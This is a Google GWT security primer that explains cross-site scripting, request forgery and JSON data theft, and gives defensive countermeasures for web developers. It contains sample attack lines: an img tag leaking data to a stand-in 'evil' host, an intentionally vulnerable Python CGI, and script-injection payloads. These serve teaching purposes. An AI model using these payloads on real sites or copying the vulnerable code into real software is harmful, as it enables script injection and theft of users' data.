<i>Dan Morrill, Google Developer Relations Team</i>
<br>
<i>Updated January 2009</i>

<p>It is a sad truth that JavaScript applications are easily left vulnerable to several types of security exploits, if developers are unwary. Because the GWT produces JavaScript code, we GWT developers are no less vulnerable to JavaScript attacks than anyone else. However, because the goal of GWT is to allow developers to focus on their users' needs instead of JavaScript and browser quirks, it's easy to let our guards down. To make sure that GWT developers have a strong appreciation of the risks, we've put together this article.</p>

<p>GWT's mission is to provide developers with the tools they need to build AJAX apps that make the web a better place for end users. However, the apps we build have to be <i>secure</i> as well as functional, or else our community isn't doing a very good job at our mission.</p>

<p>This article is a primer on JavaScript attacks, intended for GWT developers. The first portion describes the major classes of attacks against JavaScript in general terms that are applicable to any AJAX framework. After that background information on the attacks, the second portion describes how to secure your GWT applications against them.</p>

<ol class="toc" id="pageToc">
  <li><a href="#vulnerabilities">Part 1: JavaScript Vulnerabilities</a></li>
  <ol style="list-style: none">
    <li><a href="#leaking">Leaking Data</a></li>
    <li><a href="#cross-site">Cross-Site Scripting</a></li>
    <li><a href="#forging">Forging Requests</a></li>
    <li><a href="#json-xsrf">JSON and XSRF</a></li>
  </ol>
  <li><a href="#fight">Part 2: How GWT Developers Can Fight Back</a></li>
  <ol style="list-style: none">
    <li><a href="#xss">XSS and GWT</a></li>
    <li><a href="#xsrf">XSRF and GWT</a></li>
    <li><a href="#json">JSON and GWT</a></li>
  </ol>
  <li><a href="#conclusion">Conclusion</a></li>
</ol>


<h2 id="vulnerabilities">Part 1: JavaScript Vulnerabilities</h2>

<p>These problems, like so many others on the Internet, stem from malicious programmers. There are people out there who spend a huge percentage of their lives thinking of creative ways to steal your data. Vendors of web browsers do their part to stop those people, and one way they accomplish it is with the Same-Origin Policy.</p>

<p>The <a href="http://en.wikipedia.org/wiki/Same_origin_policy">Same-Origin Policy</a> (SOP) says that code running in a page that was loaded from Site A can't access data or network resources belonging to any other site, or even any other page (unless that other page was also loaded from Site A.) The goal is to prevent malicious hackers from injecting evil code into Site A that gathers up some of your private data and sends it to their evil Site B. This is, of course, the well-known restriction that prevents your AJAX code from making an <a href="http://www.w3.org/TR/XMLHttpRequest/#introduction">XMLHTTPRequest</a> call to a URL that isn't on the same site as the current page. Developers familiar with Java Applets will recognize this as a very similar security policy.</p>

<p>There is, however, a way around the Same-Origin Policy, and it all starts with trust. A web page owns its own data, of course, and is free to submit that data back to the web site it came from. JavaScript code that's already running is trusted to not be evil, and to know what it's doing. If code is already running, it's too late to stop it from doing anything evil anyway, so you might as well trust it.</p>

<p>One thing that JavaScript code is trusted to do is load more content. For example, you might build a basic image gallery application by writing some JavaScript code that inserts and deletes &lt;img&gt; tags into the current page. When you insert an &lt;img&gt; tag, the browser immediately loads the image as if it had been present in the original page; if you delete (or hide) an &lt;img&gt; tag, the browser removes it from the display.</p>

<p>Essentially, the SOP lets JavaScript code do anything that the original HTML page could have done -- it just prevents that JavaScript from sending data to a different server, or from reading or writing data belonging to a different server.</p>

<h3 id="leaking">Leaking Data</h3>

<p>The text above said, "prevents JavaScript from sending data to a different server." Unfortunately, that's not strictly true. In fact it is possible to send data to a different server, although it might be more accurate to say "leak."</p>

<p>JavaScript is free to add new resources -- such as &lt;img&gt; tags -- to the current page. You probably know that you can cause an image hosted on foo.com to appear inline in a page served up by bar.com. Indeed, some people get upset if you do this to their images, since it uses their bandwidth to serve an image to your web visitor. But, it's a feature of HTML, and since HTML can do it, so can JavaScript.</p>

<p>Normally you would view this as a read-only operation: the browser requests an image, and the server sends the data. The browser didn't upload anything, so no data can be lost, right? Almost, but not quite. The browser <i>did</i> upload something: namely, the URL of the image. Images use standard URLs, and any URL can have query parameters encoded in it. A legitimate use case for this might be a page hit counter image, where a CGI on the server selects an appropriate image based on a query parameter and streams the data to the user in response. Here is a reasonable (though hypothetical) URL that could return a hit-count image showing the number '42':</p>

<pre>
http://site.domain.tld/pagehits?count=42
</pre>

<p>In the static HTML world, this is perfectly reasonable. After all, the server is not going to send the client to a web site that will leak the server's or user's data -- at least, not on purpose. Because this technique is legal in HTML, it's also legal in JavaScript, but there is an unintended consequence. If some evil JavaScript code gets injected into a good web page, it can construct &lt;img&gt; tags and add them to the page.</p>

<p>It is then free to construct a URL to any hostile domain, stick it in an &lt;img&gt; tag, and make the request. It's not hard to imagine a scenario where the evil code steals some useful information and encodes it in the &lt;img&gt; URL; an example might be a tag such as:</p>

<pre>
&lt;img src="http://evil.domain.tld/pagehits?private_user_data=12345"/&gt;
</pre>

<p>If <code>private_user_data</code> is a password, credit card number, or something similar, there'd be a major problem. If the evil code sets the size of the image to 1 pixel by 1 pixel, it's very unlikely the user will even notice it.</p>

<h3 id="cross-site">Cross-Site Scripting</h3>

<p>The type of vulnerability just described is an example of a class of attacks called "Cross-Site Scripting" (abbreviated as "XSS"). These attacks involve browser script code that transmits data (or does even worse things) across sites. These attacks are not limited to &lt;img&gt; tags, either; they can be used in most places the browser lets script code access URLs. Here are some more examples of XSS attacks:</p>

<ul>
  <li><b>Evil code creates a hidden iframe and then adds a &lt;form&gt; to it</b>. The form's action is set to a URL on a server under the attacker's control. It then fills the form with hidden fields containing information taken from the parent page, and then submits the form.</li>
  <li><b>Evil code creates a hidden iframe, constructs a URL with query parameters</b> containing information taken from the parent page, and then sets the iframe's "src" to a URL on a server under the attacker's control.</li>
  <li><b>Evil code creates a &lt;script&gt; tag</b>, which functions almost identically to the &lt;img&gt; attack. (Actually, it's a lot worse, as I'll explain in a later section.)</li>
</ul>

<p>Clearly, if evil code gets into your page, it can do some nasty stuff. By the way, don't take my examples above as a complete list; there are far too many variants of this trick to describe here.</p>

<p>Throughout all this there's a really big assumption, though: namely, that evil JavaScript code could get itself into a good page in the first place. This sounds like it should be hard to do; after all, servers aren't going to intentionally include evil code in the HTML data they send to web browsers. Unfortunately, it turns out to be quite easy to do if the server (and sometimes even client) programmers are not constantly vigilant. And as always, evil people are spending huge chunks of their lives thinking up ways to do this.</p>

<p>The list of ways that evil code can get into an otherwise good page is endless. Usually they all boil down to unwary code that parrots user input back to the user. For instance, this Python CGI code is vulnerable:</p>

<pre>
import cgi
f = cgi.FieldStorage()
name = f.getvalue('name') or 'there'

s = '&lt;html&gt;&lt;body&gt;&lt;div&gt;Hello, ' + name + '!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'

print 'Content-Type: text/html'
print 'Content-Length: %s' % (len(s),)
print
print s
</pre>

<p>The code is supposed to print a simple greeting, based on a form input. For instance, a URL like this one would print "Hello, Dan!":</p>

<pre>
http://site.domain.tld/path?name=Dan
</pre>

<p>However, because the CGI doesn't inspect the value of the "name" variable, an attacker can insert script code in there.</p>

<p>Here is some JavaScript that pops up an alert window:</p>

<pre>
&lt;script&gt;alert('Hi');&lt;/script&gt;
</pre>

<p>That script code can be encoded into a URL such as this:</p>

<pre>
http://site.domain.tld/path?name=Dan%3Cscript%20%3Ealert%28%22Hi%22%29%3B%3C/script%3E
</pre>

<p>That URL, when run against the CGI above, inserts the &lt;script&gt; tag directly into the &lt;div&gt; block in the generated HTML. When the user loads the CGI page, it still says "Hello, Dan!" but it also pops up a JavaScript alert window.</p>

<p>It's not hard to imagine an attacker putting something worse than a mere JavaScript alert in that URL. It's also probably not hard to imagine how easy it is for your real-world, more complex server-side code to accidentally contain such vulnerabilities. Perhaps the scariest thing of all is that an evil URL like the one above can exploit your servers entirely without your involvement.</p>

<p>The solution is usually simple: you just have to make sure that you escape or strip the content any time you write user input back into a new page. Like many things though, that's easier said than done, and requires constant vigilance.</p>

<h3 id="forging">Forging Requests</h3>

<p>It would be nice if we could wrap up this article at this point. Unfortunately, we can't. You see, there's a whole other class of attack that we haven't covered yet.</p>

<p>You can think of this one almost as XSS in reverse. In this scenario, the attacker lures one of your users to <i>their own site</i>, and uses their browser to attack <i>your server</i>. The key to this attack is insecure server-side session management.</p>

<p>Probably the most common way that web sites manage sessions is via browser cookies. Typically the server will present a login page to the user, who enters credentials like a user name and password and submits the page. The server checks the credentials and if they are correct, sets a browser session cookie. Each new request from the browser comes with that cookie. Since the server knows that no other web site could have set that cookie (which is true due to the browsers' Same-Origin Policy,) the server knows the user has previously authenticated.</p>

<p>The problem with this approach is that session cookies don't expire when the user leaves the site (they expire either when the browser closes or after some period of time). Since the browsers will include cookies with any request to your server regardless of context, if your users are logged in, it's possible for other sites to trigger an action on your server. This is frequently referred to as "Cross-Site Request Forging" or XSRF (or sometimes CSRF).</p>

<p>The sites most vulnerable to XSRF attacks, perhaps ironically, are those that have already embraced the service-oriented model. Traditional non-AJAX web applications are HTML-heavy and require multi-page UI operations by their very nature. The Same-Origin Policy prevents an XSRF attacker from <i>reading</i> the results of its request, making it impossible for an XSRF attacker to navigate a multi-page process. The simple technique of requiring the user to click a confirmation button -- when properly implemented -- is enough to foil an XSRF attack.</p>

<p>Unfortunately, eliminating those sorts of extra steps is one of the key goals of the AJAX programming model. AJAX lets an application's UI logic run in the browser, which in turn lets communications with the server become narrowly defined operations. For instance, you might develop corporate HR application where the server exposes a URL that lets browser clients email a user's list of employee data to someone else. Such services are operation-oriented, meaning that a single HTTP request is all it takes to do something.</p>

<p>Since a single request triggers the operation, the XSRF attacker doesn't need to see the response from an XMLHTTPRequest-style service. An AJAX-based HR site that exposes "Email Employee Data" as such a service could be exploited via an XSRF attack that carefully constructed a URL that emails the employee data to an attacker. As you can see, AJAX applications are a lot more vulnerable to an XSRF attack than a traditional web site, because the attacking page doesn't need to navigate a multi-page sequence after all.</p>

<h3 id="json-xsrf">JSON and XSRF</h3>

<p>So far we've seen the one-two punch from XSS and XSRF. Sadly, there's <i>still</i> more. These days, JSON (JavaScript Object Notation) is the new hotness -- and indeed, it's very hot. It's a clever, even elegant, technique. It also performs well, since it uses low-level (meaning: fast) browser support to handle parsing. It's also easy to program to, since the result is a JavaScript object, meaning you get object serialization almost for free. Unfortunately, with this powerful technique comes very substantial risks to your code; if you choose to use JSON with your GWT application, it's important to understand those risks.</p>

<p>At this point, you'll need to understand JSON; check out the <a href="http://json.org">json.org</a> site if you aren't familiar with it yet. A cousin of JSON is "JSON with Padding" or JSONP, so you'll also want to be familiar with that. Here's the earliest discussion of JSONP that we could find: <a href="http://bob.pythonmac.org/archives/2005/12/05/remote-json-jsonp/">Remote JSON - JSONP</a>.</p>

<p>As bad as XSS and XSRF are, JSON gives them room to breathe, so to speak, which makes them even more dangerous. The best way to explain this is just to describe how JSON is used. There are three forms, and each is vulnerable to varying degrees:</p>


<ul>
  <li style="margin-bottom: 8px;">
    A JSON string returned as the response text from an XMLHTTPRequest call (or other request)<br>
    Examples:<br>
    <code> [ 'foo', 'bar' ]</code><br>
    <code> { 'data': ['foo', 'bar'] }</code><br>
    Typically these strings are parsed via a call to JavaScript's 'eval' function for fast decoding.<br>
  </li>
  <li style="margin-bottom: 8px;">
    A string containing a JSON object assigned to a variable, returned by a server as the response to a &lt;script&gt; tag.<br>
    Example:<br>
    <code> var result = { 'data': ['foo', 'bar'] };</code><br>
  </li>
  <li>
    A string containing a JSON object passed as the parameter to a function call -- that is, the JSONP model.<br>
    Example:<br>
    <code> handleResult({'data': ['foo', 'bar']});</code>
  </li>
</ul>


<p>The last two examples are most useful when returned from a server as the response to a &lt;script&gt; tag inclusion. This could use a little explanation. Earlier text described how JavaScript is permitted to dynamically add &lt;img&gt; tags pointing to images on remote sites. The same is true of &lt;script&gt; tags: JavaScript code can dynamically insert new &lt;script&gt; tags that cause more JavaScript code to load.</p>

<p>This makes dynamic &lt;script&gt; insertion a very useful technique, especially for mashups. Mashups frequently need to fetch data from different sites, but the Same-Origin Policy prevents them from doing so directly with an XMLHTTPRequest call. However, currently-running JavaScript code is trusted to load new JavaScript code from different sites -- and who says that code can't actually be data?</p>

<p>This concept might seem suspicious at first since it seems like a violation of the Same-Origin restriction, but it really isn't. Code is either trusted or it's not. Loading more code is more dangerous than loading data, so since your current code is already trusted to load more code, why should it not be trusted to load data as well? Meanwhile, &lt;script&gt; tags can only be inserted by trusted code in the first place, and the entire meaning of trust is that... you trust it to know what it's doing. It's true that XSS can abuse trust, but ultimately XSS can only originate from buggy server code. Same-Origin is based on trusting the server -- bugs and all.</p>

<p>So what does this mean? How is writing a server-side service that exposes data via these methods vulnerable? Well, other people have explained this a lot better than we can cover it here. Here are some good treatments:</p>

<ul>
  <li><a href="http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/">JSON is not as safe as people think it is</a></li>
  <li><a href="http://robubu.com/?p=24">Safe JSON</a></li>
</ul>

<p>Go ahead and read those -- and be sure to follow the links! Once you've digested it all, you'll probably see that you should tread carefully with JSON -- whether you're using GWT or another tool.</p>

<h2 id="fight">Part 2: How GWT Developers Can Fight Back</h2>

<p>But this is an article for GWT developers, right? So how are GWT developers affected by these things? The answer is that we are no less vulnerable than anybody else, and so we have to be just as careful. The sections below describe how each threat impacts GWT in detail.</p>

<h3 id="xss">XSS and GWT</h3>

<p class="note">
  Also see <a href="../doc/latest/DevGuideSecuritySafeHtml.html">SafeHtml</a> &ndash; Provides coding guidelines with examples showing how to protect your application from XSS vulnerabilities due to untrusted data
</p>

<p>XSS can be avoided if you rigorously follow good JavaScript programming practices. Since GWT helps you follow good JavaScript practices in general, it can help you with XSS. However, GWT developers are not immune, and there simply is no magic bullet.</p>

<p>Currently, we believe that GWT isolates your exposure to XSS attacks to these vectors:</p>

<ul>
  <li>JavaScript on your host page that is unrelated to GWT</li>
  <li>Code you write that sets <code>innerHTML</code> on GWT Widget objects</li>
  <li>Using the JSON API to parse untrusted strings (which ultimately calls JavaScript's eval function)</li>
  <li><a href="../doc/latest/DevGuideCodingBasicsJSNI.html" title="JavaScript Native Interface (JSNI)">JavaScript Native Interface (JSNI)</a> code that you write that does something unsafe (such as setting innerHTML, calling eval, writing directly to the document via <code>document.write</code>, etc.)</li>
</ul>

<p>Don't take our word for it, though! Nobody's perfect, so it's important to always keep security on your mind. Don't wait until your security audit finds a hole, think about it constantly as you code.</p>

<p>Read on for more detail on the four vectors above.</p>

<h4 id="non-gwt">Non-GWT JavaScript</h4>

<p>Many developers use GWT along with other JavaScript solutions. For instance, your application might be using a mashup with code from several sites, or you might be using a third-party JavaScript-only library with GWT. In these cases, your application could be vulnerable due to those non-GWT libraries, even if the GWT portion of your application is secure.</p>

<p>If you are mixing other JavaScript code with GWT in your application, it's important that you review all the pieces to be sure your entire application is secure.</p>

<h4 id="innerhtml">Code that sets innerHTML</h4>

<p>It's a common technique to fill out the bodies of tables, DIVs, frames, and similar UI elements with some static HTML content. This is most easily accomplished by assigning to the innerHTML attribute on a JavaScript object. However, this can be risky since it allows evil content to get inserted directly into a page.</p>

<p>Here's an example. Consider this basic JavaScript page:</p>

<pre>
&lt;html&gt;
&lt;head&gt;
  &lt;script language="JavaScript"&gt;
    function fillMyDiv(newContent) {
      document.getElementById('mydiv').innerHTML = newContent;
    }
  &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;p&gt;Some text before mydiv.&lt;/p&gt;
  &lt;div id="mydiv"&gt;&lt;/div&gt;
  &lt;p&gt;Some text after mydiv.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

<p>The page contains a placeholder &lt;div&gt; named 'mydiv', and a JavaScript function that simply sets innerHTML on that div. The idea is that you would call that function from other code on your page whenever you wanted to update the content being displayed. However, suppose an attacker contrives to get a user to pass in this HTML as the 'newContent' variable: <code>&lt;div onmousemove="alert('Hi!');"&gt;Some text&lt;/div&gt;</code></p>

<p>Whenever the user mouses over 'mydiv', an alert will appear. If that's not frightening enough, there are other techniques -- only slightly more complicated -- that can execute code immediately without even needing to wait for user input. This is why setting innerHTML can be dangerous; you've got to be sure that the strings you use are trusted.</p>

<p>It's also important to realize that a string is not necessarily trusted just because it comes from your server! Suppose your application contains a report, which has "edit" and "view" modes in your user interface. For performance reasons, you might generate the custom-printed report in plain-old HTML on your server. Your GWT application would display it by using a <code>RequestCallback</code> to fetch the HTML and assign the result to a table cell's innerHTML property. You might assume that that string is trusted since your server generated it, but that could be a bad assumption. If the user is able to enter arbitrary input in "edit" mode, an attacker could use any of a variety of attacks to get the user to store some unsafe HTML in a record. When the user views the record again, that record's HTML would be evil.</p>

<p>Unless you do an extremely thorough analysis of both the client and server, you can't assume a string from your server is safe. To be truly safe, you may want to always assume that strings destined for innerHTML or eval are unsafe, but at the very least you've got to Know Your Code.</p>

<h4 id="parsing-json">Parsing JSON Strings</h4>

<p>This is a very similar scenario to setting innerHTML, although with arguably worse implications. Suppose that you have the same example as the one just described, except that instead of returning HTML content, the server sends the report data to the browser as a JSON string. You would normally pass that string to GWT's JSONParser class. For performance reasons, though, that string calls eval(). It's important to be sure that the code you are passing doesn't contain evil code.</p>

<p>An attacker could again use one of several attacks to cause the user to save carefully-constructed JavaScript code into one of your data records. That code could contain evil side effects that take effect immediately when the JSON object is parsed. This is just as severe as innerHTML but is actually easier to do since the attacker doesn't need to play tricks with HTML in the evil string -- he can just use plain JavaScript code.</p>

<p>As with innerHTML, it's not always correct to assume that a JSON string is safe simply because it came from your server. At the very least, it is important to think carefully before you use any JSON service, whether it's yours or a third party's.</p>

<h4 id="jsni">Your Own JSNI Code</h4>

<p>GWT has little control over or insight into JSNI code you write. If you write JSNI code, it's important to be especially cautious. Calling the eval function or setting innerHTML should set off red flags immediately, but you should always think carefully as you write code.</p>

<p>For instance, if you're writing a custom Widget that includes a hyperlink, you might include a <code>setURL(String)</code> method. If you do, though, you should consider adding a test to make sure that the new URL data doesn't actually contain a <code>"javascript:"</code> URL. Without this test, your setURL method could create a new vector for XSS code to get into your application. This is just one possible example; always think carefully about unintended effects when you use JSNI.</p>

<h4 id="protecting">Protecting Your Application</h4>

<p>As a GWT user, you can help reduce XSS vulnerabilities in your code by following these guidelines:</p>

<ul>
  <li>Carefully inspect and strip or escape any strings you assign to innerHTML using GWT code</li>
  <li>Carefully inspect any JavaScript strings you pass to GWT's JSON parser</li>
  <li>Carefully inspect any strings you pass to eval or assign to innerHTML via a JSNI method</li>
  <li>Take care in your native JSNI methods to not do anything that would expose you to attacks</li>
</ul>

<p>The GWT team is considering adding support for standard string inspection to the GWT library. You would use this to validate any untrusted string to determine if it contains unsafe data (such as a &lt;script&gt; tag.) The idea is that you'd use this method to help you inspect any strings you need to pass to innerHTML or eval. However, this functionality is only being considered right now, so for the time being it's still important to do your own inspections. Be sure to follow the guidelines above -- and be sure to be paranoid!</p>

<h3 id="xsrf">XSRF and GWT</h3>
<p class="note">
  Also see <a href="../doc/latest/DevGuideSecurityRpcXsrf.html">GWT RPC XSRF protection</a> &ndash; Explains how to protect GWT RPCs against XSRF attacks using RPC tokens introduced in GWT 2.3.
</p>
<p>You can take steps to make your GWT application less vulnerable to XSRF attacks. The same techniques that you might use to protect other AJAX code will also work to protect your GWT application.</p>

<p>A common countermeasure for XSRF attacks involves duplicating a session cookie. Earlier, we discussed how the usual cookie-based session management model leaves your application open to XSRF attacks. An easy way to prevent this is to use JavaScript to copy the cookie value and submit it as form data along with your XMLHTTPRequest call. Since the browser's Same-Origin Policy will prevent a third-party site from accessing the cookies from your site, only your site can retrieve your cookie. By submitting the value of the cookie along with the request, your server can compare the actual cookie value with the copy you included; if they don't match, your server knows that the request is an XSRF attempt. Simply put, this technique is a way of requiring the code that made the request to prove that it has access to the session cookie.</p>

<h4>Protecting Your Application</h4>

<p>If you are using the <a href="http://google-web-toolkit.googlecode.com/svn/javadoc/1.5/com/google/gwt/http/client/RequestBuilder.html">RequestBuilder</a> and <a href="http://google-web-toolkit.googlecode.com/svn/javadoc/1.5/com/google/gwt/http/client/RequestCallback.html">RequestCallback</a> classes in GWT, you can implement XSRF protection by setting a custom header to contain the value of your cookie. Here is some sample code:</p>

<pre>
RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, url);
rb.setHeader("X-XSRF-Cookie", Cookies.getCookie("myCookieKey"));
rb.sendRequest(null, myCallback);
</pre>

<p>If you are using GWT's RPC mechanism, the solution is unfortunately not quite as clean. However, there are still several ways you can accomplish it. For instance, you can add an argument to each method in your <a href="http://google-web-toolkit.googlecode.com/svn/javadoc/1.5/com/google/gwt/user/client/rpc/RemoteService.html">RemoteService</a> interface that contains a String. That is, if you wanted this interface:</p>

<pre>
public interface MyInterface extends RemoteService {
  public boolean doSomething();
  public void doSomethingElse(String arg);
}
</pre>

<p>...you could actually use this:</p>

<pre>
public interface MyInterface extends RemoteService {
  public boolean doSomething(String cookieValue);
  public void doSomethingElse(String cookieValue, String arg);
}
</pre>

<p>When you call the method, you would pass in the current cookie value that you fetch using <code>Cookies.getCookie(String)</code>.</p>

<p>If you prefer not to mark up your <code>RemoteService</code> interfaces in this way, you can do other things instead. You might modify your data-transfer objects to have a field name containing the <code>cookieValue</code>, and set that value whenever you create them. Perhaps the simplest solution is to simply add the cookie value to your URL as a <code>GET</code> parameter. The important thing is to get the cookie value up to the server, somehow.</p>

<p>In all of these cases, of course, you'll have to have your server-side code compare the duplicate value with the actual cookie value and ensure that they're the same.</p>

<p>The GWT team is also considering enhancing the RPC system to make it easier to prevent XSRF attacks. Again though, that will only appear in a future version, and for now you should take precautions on your own.</p>

<h3 id="json">JSON and GWT</h3>

<h4>Protecting Your Single-Site Application</h4>

<p>Attacks against JSON and JSONP are pretty fundamental. Once the browser is running the code, there's nothing you can do to stop it. The best way to protect your server against JSON data theft is to avoid sending JSON data to an attacker in the first place.</p>

<p>That said, some people advise JSON developers to employ an extra precaution besides the cookie duplication XSRF countermeasure. In this model, your server code would wrap any JSON response strings within JavaScript block comments. For example, instead of returning

<pre> <code>['foo', 'bar']</code> you would instead return <code>/*['foo', 'bar']*/</code>. </pre>

The client code is then expected to strip the comment characters prior to passing the string to the eval function.</p>

<p>The primary effect of this is that it prevents your JSON data from being stolen via a &lt;script&gt; tag. If you normally expect your server to export JSON data in response to a direct XMLHTTPRequest, this technique would prevent attackers from executing an XSRF attack against your server and stealing the response data via one of the attacks linked to earlier.</p>

<p>If you only intend your JSON data to be returned via an XMLHTTPRequest, wrapping the data in a block comment prevents someone from stealing it via a &lt;script&gt; tag. If you are using JSON as the data format exposed by your own services and don't intend servers in other domains to use it, then there is no reason not to use this technique. It might keep your data safe even in the event that an attacker manages to forge a cookie.</p>

<h4>Protecting Your Mashup</h4>

<p>You should also use the XSRF cookie-duplication countermeasure if you're exposing services for other mashups to use. However, if you're building a JSONP service that you want to expose publicly, the second comment-block technique we just described will be a hindrance.</p>

<p>The reason is that the comment-wrapping technique works by totally disabling support for &lt;script&gt; tags. Since that is at the heart of JSONP, it disables that technique. If you are building a web service that you want to be used by other sites for in-browser mashups, then this technique would prevent that.</p>

<p>Conversely, be very careful if you're building mashups with someone else's site! If your application is a "JSON consumer" fetching data from a different domain via dynamic &lt;script&gt; tags, you are exposed to any vulnerabilities they may have. If their site is compromised, your application could be as well. Unfortunately, with the current state of the art, there isn't much you can do about this. After all -- by using a &lt;script&gt; tag, you're trusting their site. You just have to be sure that your trust is well-placed.</p>

<p>In other words, if you have critical private information on your own server, you should probably avoid in-browser JSONP-style mashups with another site. Instead, you might consider building your server to act as a relay or proxy to the other site. With that technique, the browser only communicates with your site, which allows you to use more rigorous protections. It may also provide you with an additional opportunity to inspect strings for evil code.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Web 2.0 can be a scary place. Hopefully we've given you some food for thought and a few techniques you can implement to keep your users safe. Mostly, though, we hope we've instilled a good healthy dose of paranoia in you. If Benjamin Franklin were alive today, he might add a new "certainty" to his famous list: death, taxes... and people trying to crack your site. The only thing we can be sure of is that there will be other exploits in the future, so paranoia will serve you well over time.</p>

<p>As a final note, we'd like to stress one more time the importance of staying vigilant. This article is not an exhaustive list of the security threats to your application. This is just a primer, and someday it could become out of date. There may also be other attacks which we're simply unaware of. While we hope you found this information useful, the most important thing you can do for your users' security is to keep learning, and stay as well-informed as you can about security threats.</p>

<p>As always, if you have any feedback for us or would like to discuss this issue &mdash; now or in the future &mdash; please visit our <a href="http://groups.google.com/group/Google-Web-Toolkit">GWT Developer Forum</a>.</p>


